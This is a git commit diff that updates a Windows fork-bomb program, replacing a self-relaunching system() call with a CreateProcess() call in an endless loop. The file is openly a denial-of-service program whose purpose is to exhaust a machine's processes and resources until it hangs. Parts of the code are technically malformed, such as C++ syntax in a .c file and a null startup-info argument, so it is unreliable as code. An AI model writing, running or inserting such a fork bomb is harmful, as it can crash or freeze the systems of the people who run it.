aa5a026c0da4a029ab51f8305aad9cc1d789fd26
Backup-eric645 <52118151+Backup-eric645@users.noreply.github.com>
2020-04-05 15:59:30 -0400

    Update forkbomb-win32.c

--- forkbomb-win32.c
+++ forkbomb-win32.c
@@ -1,8 +1,12 @@
 #include <Windows.h>
 int main(int argc, const char * argv[])
 {
+    auto s = new SECURITY_ATTRIBUTES;
+    s->nLength = sizeof(SECURITY_ATTRIBUTES);
+    s->lpSecurityDescriptor = 0;
+    s->bInheritHandle = 0;
     while (true)
     {
-        system("\"" + argv[0] + "\"");
+        CreateProcess(argv[0], 0, s, s, 0, NORMAL_PRIORITY_CLASS, 0, 0, 0, 0);
     }
 }
